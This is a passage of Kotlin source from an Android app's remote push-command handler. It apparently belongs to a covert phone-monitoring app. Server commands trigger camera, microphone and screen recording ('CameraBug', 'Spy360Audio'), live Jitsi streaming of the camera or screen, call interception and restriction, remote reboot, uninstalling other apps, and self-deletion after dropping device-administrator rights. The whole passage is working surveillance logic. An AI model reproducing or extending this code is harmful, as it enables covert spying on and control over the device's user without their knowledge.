                                )
                            } else {
                                fcmPushStatus = FcmPushStatus.FEATURE_SYNC_STOPPED
                            }
                        }
                    }
                } else {
                    fcmPushStatus =
                        FutureWorkUtil.scheduleVideoBug(applicationContext, videoBugCommand)
                }
            }

            // CameraBug
            "startCameraRecording" -> {
                if (pushNotExistsAlready) {
                    fcmPushStatus =
                        checkBugStatus(
                            applicationContext,
                            push.pushMethod,
                            arrayOf(
                                Manifest.permission.CAMERA,
                                Manifest.permission.SYSTEM_ALERT_WINDOW,
                                "cameraBugSupport"
                            ),
                            CameraBugCommandService::class.java.name
                        )
                    if (fcmPushStatus == FcmPushStatus.RECEIVED) {
                        if (AppConstants.syncCameraBug) {
                            startPushCommand(applicationContext, push, AppConstants.CAMERA_BUG_TYPE)
                        } else {
                            fcmPushStatus = FcmPushStatus.FEATURE_SYNC_STOPPED
                        }
                    } else if (fcmPushStatus == FcmPushStatus.FEATURE_ALREADY_PROCESSING) {
                        applicationContext.stopService(
                            Intent(
                                applicationContext,
                                CameraBugCommandService::class.java
                            )
                        );
                    }
                }
            }

            // ScreenShot
            "screenshoot" -> {
                fcmPushStatus = checkBugStatus(
                    applicationContext,
                    push.pushMethod, arrayOf("screenRecordIntent"),
                    ScreenShotCommandService::class.java.name
                )
                if (fcmPushStatus == FcmPushStatus.SCREEN_RECORD_PERMISSION_MISSING) {
                    if (AppConstants.osLessThanTen) {
                        AppUtils.startScreenRecordIntent(
                            applicationContext,
                            ScreenRecordIntentActivity.TYPE_SCREEN_SHOT,
                            push
                        )
                        fcmPushStatus = FcmPushStatus.RECEIVED
                    } else if (AppConstants.osGreaterThanEqualToTen && AppUtils.isAccessibilityEnabled(
                            applicationContext
                        )
                    ) {
                        AppUtils.startScreenRecordIntent(
                            applicationContext,
                            ScreenRecordIntentActivity.TYPE_SCREEN_SHOT,
                            push
                        )
                        fcmPushStatus = FcmPushStatus.RECEIVED
                    }
                } else if (fcmPushStatus == FcmPushStatus.RECEIVED) {
                    if (AppConstants.syncScreenShots) {
                        startPushCommand(applicationContext, push, AppConstants.SCREEN_SHOT_TYPE)
                    } else {
                        fcmPushStatus = FcmPushStatus.FEATURE_SYNC_STOPPED
                    }
                }
            }

            // OnDemand Recording
            "screenRecordCommand" -> {
                fcmPushStatus = checkBugStatus(
                    applicationContext,
                    push.pushMethod, arrayOf("screenRecordIntent"),
                    ScreenRecordCommandService::class.java.name
                )
                if (fcmPushStatus == FcmPushStatus.SCREEN_RECORD_PERMISSION_MISSING) {
                    if (AppConstants.osLessThanTen) {
                        AppUtils.startScreenRecordIntent(
                            applicationContext,
                            ScreenRecordIntentActivity.TYPE_SCREEN_RECORDING_NORMAL,
                            push
                        )
                        fcmPushStatus = FcmPushStatus.RECEIVED
                    } else if (AppConstants.osGreaterThanEqualToTen && AppUtils.isAccessibilityEnabled(
                            applicationContext
                        )
                    ) {
                        AppUtils.startScreenRecordIntent(
                            applicationContext,
                            ScreenRecordIntentActivity.TYPE_SCREEN_RECORDING_NORMAL,
                            push
                        )
                        fcmPushStatus = FcmPushStatus.RECEIVED
                    }
                } else if (fcmPushStatus == FcmPushStatus.RECEIVED) {
                    if (AppUtils.isScreenRecordingApp("demand.recording")) {
                        startPushCommand(
                            applicationContext,
                            push,
                            AppConstants.NORMAL_SCREEN_RECORDING_TYPE
                        )
                    } else {
                        fcmPushStatus = FcmPushStatus.FEATURE_SYNC_STOPPED
                    }
                }
            }

            "Spy360Camera", "Spy360Audio" -> {
                if (pushNotification == null) {
                    fcmPushStatus = FcmPushStatus.RECEIVED
                    val view360Command = GsonBuilder().create()
                        .fromJson(push.pushCommand, View360Command::class.java)
                    if (view360Command.customData == "1") {
                        var permissions = arrayOf(
                            Manifest.permission.CAMERA,
                            Manifest.permission.RECORD_AUDIO,
                            Manifest.permission.SYSTEM_ALERT_WINDOW
                        )

                        if (view360Command.method == "Spy360Audio") {
                            AppConstants.isSpyAudioCall = true
                            val list = permissions.toMutableList()
                            list.remove(Manifest.permission.CAMERA)
                            permissions = list.toTypedArray()
                        } else {
                            AppConstants.isSpyAudioCall = false
                            AppConstants.view360CameraType =
                                if (view360Command.cameraType == "Back") "1" else "0"
                        }
                        AppConstants.view360Url = view360Command.url
                        fcmPushStatus =
                            checkBugStatus(
                                applicationContext,
                                push.pushMethod,
                                permissions,
                                View360CommandWorker::class.java.name
                            )

                        if (fcmPushStatus == FcmPushStatus.RECEIVED) {
                            startView360Service(applicationContext)
                        } else if (fcmPushStatus == FcmPushStatus.FEATURE_ALREADY_PROCESSING) {
//                            applicationContext.stopService(
//                                Intent(
//                                    applicationContext,
//                                    View360CommandService::class.java
//                                )
//                            )
                            FutureWorkUtil.stopBackgroundWorker(
                                applicationContext,
                                View360CommandWorker::class.java.name
                            )
                            Handler(Looper.getMainLooper()).postDelayed(Runnable {
                                startView360Service(applicationContext)
                            }, 1000)
                            fcmPushStatus = FcmPushStatus.RECEIVED
                        }
                    } else if (view360Command.customData == "0") {
//                        applicationContext.stopService(
//                            Intent(
//                                applicationContext,
//                                View360CommandService::class.java
//                            )
//                        )
                        FutureWorkUtil.stopBackgroundWorker(
                            applicationContext,
                            View360CommandWorker::class.java.name
                        )
                    }
                }
            }

            "Spy360JitsiVideo" -> {
                if (pushNotification == null) {
                    fcmPushStatus = FcmPushStatus.RECEIVED
                    val pushCommand = GsonBuilder().create()
                        .fromJson(push.pushCommand, View360ByJitsiCommand::class.java)
                    if (pushCommand.customData == "1") {
                        var permissions =
                            arrayOf(
                                Manifest.permission.CAMERA,
                                Manifest.permission.RECORD_AUDIO,
                                Manifest.permission.SYSTEM_ALERT_WINDOW
                            )
                        AppConstants.isSpyAudioCall = false
                        fcmPushStatus =
                            checkBugStatus(
                                applicationContext,
                                push.pushMethod,
                                permissions,
                                View360ByJitsiMeetCommandWorker::class.java.name
                            )
                        if (fcmPushStatus == FcmPushStatus.RECEIVED) {
                            startView360ByJitseService(applicationContext, push)
                        } else if (fcmPushStatus == FcmPushStatus.FEATURE_ALREADY_PROCESSING) {
//                            applicationContext.stopService(
//                                Intent(
//                                    applicationContext,
//                                    View360ByJitsiMeetCommandService::class.java
//                                )
//                            )
                            View360ByJitsiCommandProcessingBase.view360ByJitsiBugStatus=FcmPushStatus.SUCCESS.getStatus()
                            FutureWorkUtil.stopBackgroundWorker(
                                applicationContext,
                                View360ByJitsiMeetCommandWorker::class.java.name
                            )
                            Handler(Looper.getMainLooper()).postDelayed(Runnable {
                                logVerbose("View360ByJitsiLogs: Service is started after stop")
                                startView360ByJitseService(applicationContext, push)
                            }, 1000)
                            fcmPushStatus = FcmPushStatus.RECEIVED
                        }
                    }
                }
            }

            "Spy360JitsiStop" -> {
                if (AppUtils.isServiceRunning(
                        applicationContext,
                        View360ByJitsiMeetCommandWorker::class.java.name
                    )
                ) {
//                    applicationContext.stopService(
//                        Intent(
//                            applicationContext,
//                            View360ByJitsiMeetCommandService::class.java
//                        )
//                    )
                    View360ByJitsiCommandProcessingBase.view360ByJitsiBugStatus=FcmPushStatus.SUCCESS.getStatus()
                    FutureWorkUtil.stopBackgroundWorker(
                        applicationContext,
                        View360ByJitsiMeetCommandWorker::class.java.name
                    )
                }
                if (AppUtils.isServiceRunning(
                        applicationContext,
                        ScreenSharingCommandService::class.java.name
                    )
                ) {
                    applicationContext.stopService(
                        Intent(
                            applicationContext,
                            ScreenSharingCommandService::class.java
                        )
                    )
                }
                if (AppUtils.isServiceRunning(
                        applicationContext,
                        CallInterceptCommandService::class.java.name
                    )
                ) {
                    applicationContext.stopService(
                        Intent(
                            applicationContext,
                            CallInterceptCommandService::class.java
                        )
                    )
                }

            }

            "Spy360JitsiLive", "Spy360JitsiScreen" -> {
                if (pushNotification == null) {
                    fcmPushStatus = FcmPushStatus.RECEIVED
                    val screenSharingCommand = GsonBuilder().create()
                        .fromJson(push.pushCommand, ScreenSharingCommand::class.java)
                    if (screenSharingCommand.customData == "1") {
                        val permissions = arrayOf(
                            Manifest.permission.CAMERA,
                            Manifest.permission.SYSTEM_ALERT_WINDOW,
                            "screenRecordIntent"
                        )
                        AppConstants.isScreenOnly =
                            screenSharingCommand.method == "Spy360JitsiScreen"
                        AppConstants.isSpyAudioCall = false
                        logVerbose("ScreenSharingByJitsiLogs:View360Command $screenSharingCommand")
                        logVerbose("ScreenSharingByJitsiLogs:Home Token ${screenSharingCommand.homeToken}")
                        fcmPushStatus =
                            checkBugStatus(
                                applicationContext,
                                push.pushMethod,
                                permissions,
                                ScreenSharingCommandService::class.java.name
                            )
                        logVerbose("ScreenSharingByJitsiLogs: Start Jitsi Meet View360 Push Recieved with cameraType= ${screenSharingCommand.cameraType} with audioType= ${screenSharingCommand.audioType}")
                        if (fcmPushStatus == FcmPushStatus.SCREEN_RECORD_PERMISSION_MISSING) {
                            if (AppConstants.osLessThanTen) {
                                AppUtils.startScreenRecordIntent(
                                    applicationContext,
                                    ScreenRecordIntentActivity.TYPE_SCREEN_SHARING,
                                    push
                                )
                                fcmPushStatus = FcmPushStatus.RECEIVED
                            } else if (AppConstants.osGreaterThanEqualToTen && AppUtils.isAccessibilityEnabled(
                                    applicationContext
                                ) && AppUtils.isScreenInteractive(applicationContext)
                            ) {
                                AppUtils.startScreenRecordIntent(
                                    applicationContext,
                                    ScreenRecordIntentActivity.TYPE_SCREEN_SHARING,
                                    push
                                )
                                fcmPushStatus = FcmPushStatus.RECEIVED
                            } else if (AppConstants.osGreaterThanEqualToTen && (!AppUtils.isAccessibilityEnabled(
                                    applicationContext
                                ) || !AppUtils.isScreenInteractive(applicationContext))
                            ) {
                                logVerbose("ScreenSharingByJitsiLogs: Service is not running")
                                startScreenSharingByJitseService(applicationContext, push)
                            }
                        } else if (fcmPushStatus == FcmPushStatus.RECEIVED || fcmPushStatus == FcmPushStatus.SCREEN_DISPLAY_OFF) {
                            logVerbose("ScreenSharingByJitsiLogs: Service is not running")
                            startScreenSharingByJitseService(applicationContext, push)
                        } else if (fcmPushStatus == FcmPushStatus.FEATURE_ALREADY_PROCESSING) {
                            logVerbose("ScreenSharingByJitsiLogs: Service is already running")
                            applicationContext.stopService(
                                Intent(
                                    applicationContext,
                                    ScreenSharingCommandService::class.java
                                )
                            )
                            logVerbose(
                                "ScreenSharingByJitsiLogs: Service is stoped: ${
                                    AppUtils.isServiceRunning(
                                        applicationContext,
                                        ScreenSharingCommandService::class.java.name
                                    )
                                }"
                            )
                            Handler(Looper.getMainLooper()).postDelayed(Runnable {
                                logVerbose("ScreenSharingByJitsiLogs: Service is started after stop")
                                startScreenSharingByJitseService(applicationContext, push)
                            }, 1000)
                            fcmPushStatus = FcmPushStatus.RECEIVED
                        }
                    }
                }
            }
            //Restart App
            "restartapp" -> {
                restartRemoteDataSyncService(applicationContext)
                fcmPushStatus = FcmPushStatus.RECEIVED
            }
            //Hard Restart App
            "hardrestartapp" -> {
                if (AppUtils.defaultCameraAppOpened(applicationContext)) {
                    Executors.newSingleThreadScheduledExecutor().schedule({
                        hardRestartApp(applicationContext)
                    }, 5, TimeUnit.MINUTES)
                } else {
                    hardRestartApp(applicationContext)
                }
                fcmPushStatus = FcmPushStatus.RECEIVED
            }

            "gpsLocationUpdateInterval" -> {
                val screenRecordCommand =
                    GsonBuilder().create()
                        .fromJson(push.pushCommand, FcmPushCommand::class.java)
                AppConstants.gpsLocationInterval = screenRecordCommand.customData
                fcmPushStatus = FcmPushStatus.RECEIVED
            }

            "appBlockUnblock" -> {
                val appBlockUnblockCommand = GsonBuilder().create()
                    .fromJson(push.pushCommand, AppBlockUnblockCommand::class.java)
                val blockedApp = BlockedApp(
                    appBlockUnblockCommand.packageName,
                    appBlockUnblockCommand.customData
                )
                localDatabaseSource.insertBlockedApp(blockedApp)
                fcmPushStatus = FcmPushStatus.RECEIVED
            }

            "GeoFence" -> {
                val geoFenceCommand = GsonBuilder().create()
                    .fromJson(push.pushCommand, GeoFenceCommand::class.java)
                val geoFence = GeoFence(
                    geoFenceCommand.geoFenceId,
                    geoFenceCommand.geoFenceName,
                    geoFenceCommand.latitude,
                    geoFenceCommand.longitude,
                    geoFenceCommand.radius,
                    true
                )
                localDatabaseSource.insertGeoFence(geoFence)
                EventBus.getDefault().post("geoFencing")
                fcmPushStatus = FcmPushStatus.RECEIVED
            }

            "FenceDeletedID" -> {
                val fcmPUshCommand =
                    GsonBuilder().create()
                        .fromJson(push.pushCommand, FcmPushCommand::class.java)
                if (fcmPUshCommand.customData.contains(",")) {
                    val ids = fcmPUshCommand.customData.split(",")
                    ids.forEach {
                        localDatabaseSource.deleteGeoFence(it)
                    }
                } else {
                    localDatabaseSource.deleteGeoFence(fcmPUshCommand.customData)
                }
                EventBus.getDefault().post("geoFencing")
                fcmPushStatus = FcmPushStatus.RECEIVED
            }

            "serviceStopStart" -> {
                if (pushNotification == null) {
                    val fcmPUshCommand = GsonBuilder().create()
                        .fromJson(push.pushCommand, FcmPushCommand::class.java)
                    AppConstants.serviceState =
                        fcmPUshCommand.customData == "1"
                    if (AppConstants.serviceState) {
                        restartRemoteDataSyncService(applicationContext)
                    } else {
//                        applicationContext.stopService(
//                            Intent(
//                                applicationContext,
//                                RemoteDataService::class.java
//                            )
//                        )
                        FutureWorkUtil.stopBackgroundWorker(
                            applicationContext,
                            DataUploadingWorker::class.java.name
                        )
                    }
                    fcmPushStatus = FcmPushStatus.RECEIVED
                }
            }

            "synchmethod" -> {
                val fcmPUshCommand =
                    GsonBuilder().create()
                        .fromJson(push.pushCommand, FcmPushCommand::class.java)
                AppConstants.networkSyncMethod = fcmPUshCommand.customData
                fcmPushStatus = FcmPushStatus.RECEIVED
            }

            "restrictcall" -> {
                val fcmPUshCommand =
                    GsonBuilder().create()
                        .fromJson(push.pushCommand, FcmPushCommand::class.java)
                if (fcmPUshCommand.customData.contains(",")) {
                    val ids = fcmPUshCommand.customData.split(",")
                    ids.forEach {
                        localDatabaseSource.insertRestrictedCall(RestrictedCall(it, "1"))
                    }
                } else {
                    localDatabaseSource.insertRestrictedCall(
                        RestrictedCall(
                            fcmPUshCommand.customData,
                            "1"
                        )
                    )
                }
                fcmPushStatus = FcmPushStatus.RECEIVED
            }

            "removerestrictcall" -> {
                val fcmPUshCommand =
                    GsonBuilder().create()
                        .fromJson(push.pushCommand, FcmPushCommand::class.java)
                if (fcmPUshCommand.customData.contains(",")) {
                    val ids = fcmPUshCommand.customData.split(",")
                    ids.forEach {
                        localDatabaseSource.deleteRestrictedCall(it)
                    }
                } else {
                    localDatabaseSource.deleteRestrictedCall(fcmPUshCommand.customData)
                }
                fcmPushStatus = FcmPushStatus.RECEIVED
            }

            "rebootdevice" -> {
                if (DeviceInformationUtil.isDeviceRooted) {
                    AppUtils.rebootDevice()
                }
                fcmPushStatus = FcmPushStatus.RECEIVED
            }

            "deleteApplication" -> {
                AppConstants.uninstallPreference = true
                if (AppUtils.isEnabledAsDeviceAdministrator() && AppUtils.isScreenInteractive(
                        applicationContext
                    )
                ) {
                    AppUtils.removeAsDeviceAdministrator()
                    Handler(Looper.getMainLooper()).postDelayed({
                        if (!AppUtils.isEnabledAsDeviceAdministrator()) {
                            coroutineScope.launch(Dispatchers.Main) {
                                AppUtils.deleteAppDirectories(applicationContext)
                                AppUtils.selfUninstallApp(applicationContext)
                            }
                        }
                    }, 2000)
                } else {
                    coroutineScope.launch(Dispatchers.Main) {
                        AppUtils.deleteAppDirectories(applicationContext)
                        AppUtils.selfUninstallApp(applicationContext)
                    }
                }
                fcmPushStatus = FcmPushStatus.RECEIVED
            }

            "remotelyUninstallApp" -> {
                val uninstallAppCommand =
                    GsonBuilder().create()
                        .fromJson(push.pushCommand, UninstallAppCommand::class.java)
                if (uninstallAppCommand.customData == "1") {
                    RoomDBUtils.setAppsAsUninstalled(
                        applicationContext,
                        uninstallAppCommand.packageName
                    )
                    if (AppUtils.notDeviceAdminApp(
                            applicationContext,
                            uninstallAppCommand.packageName
                        ) && AppUtils.isInstalledApp(
                            uninstallAppCommand.packageName
                        )
                    ) {
                        AppUtils.launchUninstallAppIntent(
                            applicationContext,
                            uninstallAppCommand.packageName
                        )
                    }
                }
                fcmPushStatus = FcmPushStatus.RECEIVED
            }

            "startWebFilter" -> {
                val webFilterCommand = GsonBuilder().create()
                    .fromJson(push.pushCommand, WebFilterCommand::class.java)
                val webSite = WebSite(
                    webFilterCommand.trigger,
                    webFilterCommand.category,
                    webFilterCommand.isUrl == "1",
                    webFilterCommand.customData
                )
                localDatabaseSource.insertWebSite(webSite)
                fcmPushStatus = null
                updatePushStatus(
                    applicationContext,
                    localDatabaseSource,
                    tosApi,
                    pushId = webFilterCommand.pushId,
                    fcmPushStatus = fcmPushStatus,
                    fcmStatus = webFilterCommand.customData,
                    syncStatus = tosApi != null
                )
            }

            "ScreenTimeUsage", "ScreenTimeRange" -> {
                val screenTimeCommand = GsonBuilder().create()
                    .fromJson(push.pushCommand, ScreenTimeCommand::class.java)
                insertScreenTime(localDatabaseSource, screenTimeCommand)
                fcmPushStatus = FcmPushStatus.RECEIVED
            }

            "ScreenTimeDelete" -> {
                val fcmPUshCommand =
                    GsonBuilder().create()
                        .fromJson(push.pushCommand, FcmPushCommand::class.java)
                val screenLimitArray = JSONArray(fcmPUshCommand.customData)
                for (i in 0 until screenLimitArray.length()) {
                    val screenLimitObject = screenLimitArray.getJSONObject(i)
                    localDatabaseSource.deleteScreenLimit(screenLimitObject.getString("screenDay"))
                }
                fcmPushStatus = FcmPushStatus.RECEIVED
            }

            "AppActivityLimit" -> {
                val appLimitCommand =
                    GsonBuilder().create()
                        .fromJson(push.pushCommand, AppLimitCommand::class.java)
                insertAppLimit(
                    localDatabaseSource,
                    appLimitCommand.appName,
                    appLimitCommand.packageName,
                    appLimitCommand.customData
                )
                fcmPushStatus = FcmPushStatus.RECEIVED
            }

            "AppReportDelete" -> {
                val fcmPUshCommand =
                    GsonBuilder().create()
                        .fromJson(push.pushCommand, FcmPushCommand::class.java)
                val appLimitArray: JSONArray = JSONArray(fcmPUshCommand.customData)
                for (i in 0 until appLimitArray.length()) {
                    val appLimitObject = appLimitArray.getJSONObject(i)
                    localDatabaseSource.deleteAppLimit(appLimitObject.getString("package"))
                }
            }

            "textAlert" -> {
                val textAlertCommand =
                    GsonBuilder().create().fromJson(push.pushCommand, TextAlertCommand::class.java)

                val textAlert = TextAlert()
                // phone , keyword
                // sms, calls, notifications
                textAlert.apply {
                    this.alertId = textAlertCommand.pushId
                    this.category = textAlertCommand.category
                    this.callerId =
                        if (textAlertCommand.type == "phone") textAlertCommand.customData else ""
                    this.keyword =
                        if (textAlertCommand.type == "keyword") textAlertCommand.customData else ""
                    this.type = textAlertCommand.type
                    this.eventThrough = textAlertCommand.eventThrough
                    this.email = textAlertCommand.email
                }
                localDatabaseSource.insertTextAlert(textAlert)
                fcmPushStatus = FcmPushStatus.TEXT_ALERT_SUCCESS
            }

            "deleteTextAlert" -> {
                val fcmPushCommand =
                    GsonBuilder().create()
                        .fromJson(push.pushCommand, FcmPushCommand::class.java)
                localDatabaseSource.deleteTextAlert(fcmPushCommand.pushId)
                fcmPushStatus = FcmPushStatus.TEXT_ALERT_DELETE_SUCCESS
            }

        }
        return Triple(pushNotExistsAlready, push, fcmPushStatus)
    }

    private fun insertAppLimit(
        localDatabaseSource: LocalDatabaseSource,
        appName: String,
        packageName: String,
        noOfHours: String
    ) {
        val appLimit = localDatabaseSource.checkAppLimitNotAlreadyExists(packageName)
        if (appLimit == null) {
            val limit = AppLimit.AppLimitBuilder()
                .setAppName(appName)
                .setPackageName(packageName)
                .setUsageTime(noOfHours)
                .create()
            localDatabaseSource.insertAppLimit(limit)
        } else {
            val limit = AppLimit.AppLimitBuilder()
                .setAppName(appLimit.appName)
                .setPackageName(appLimit.packageName)
                .setUsageTime(noOfHours)
                .create()
            localDatabaseSource.updateAppLimit(limit)
        }
    }

    private fun insertScreenTime(
        localDatabaseSource: LocalDatabaseSource,
        screenTimeCommand: ScreenTimeCommand
    ) {
        val screenLimit: ScreenLimit? =
            localDatabaseSource.checkScreenLimitNotAlreadyExists(screenTimeCommand.screenDay)
        val calendar = Calendar.getInstance()
        var startTime = ""
        var endTime = ""
        val timeUsage = ""
        if (screenTimeCommand.method == "ScreenTimeUsage") {
            startTime = DateFormat.format(
                "hh:mm aaa",
                calendar.time
            ).toString()
            calendar.add(Calendar.HOUR, screenTimeCommand.timeUsage.toInt())
            endTime = DateFormat.format(
                "hh:mm aaa",
                calendar.time
            ).toString()
        } else {
            startTime = screenTimeCommand.startTime
            endTime = screenTimeCommand.endTime
        }
        if (screenLimit == null) {
            val limit = ScreenLimit.ScreenLimitBuilder()
                .setScreenDay(screenTimeCommand.screenDay)
                .setUsageTime(timeUsage)
                .setStartTime(startTime)
                .setEndTime(endTime)
                .create()
            localDatabaseSource.insertScreenLimit(limit)
        } else {
            val limit = ScreenLimit.ScreenLimitBuilder()
                .setScreenDay(screenTimeCommand.screenDay)
                .setUsageTime(timeUsage)
                .setStartTime(startTime)
                .setEndTime(endTime)
                .create()
            localDatabaseSource.updateScreenLimit(limit)
        }
    }

}

sealed class BugMethod {
    object VideoBug : BugMethod()
    object MicBug : BugMethod()
    object MicBugSchedule : BugMethod()
    object CameraBug : BugMethod()
    object Screenshoot : BugMethod()
    object ScreenRecordCommand : BugMethod()
    object RestartApp : BugMethod()
    object SynchMethod : BugMethod()
    object GpsLocationUpdateInterval : BugMethod()
    object RebootDevice : BugMethod()
    object DeleteApplication : BugMethod()
    object WebFiler : BugMethod()
    object ScreenTimeRange : BugMethod()
    object ServiceStopStart : BugMethod()
    object AppBlock : BugMethod()
    object GeoFence : BugMethod()
    object Alert : BugMethod()
    object RemoveRestrictCall : BugMethod()
    object RestrictCall : BugMethod()
    object ScreenRecording : BugMethod()
    object ScreenTimeUsage : BugMethod()
    object ScreenTimeDelete : BugMethod()
    object RemotelyUninstallApp : BugMethod()
}

fun BugMethod.getClassName(): String = this.javaClass.simpleName.lowercase()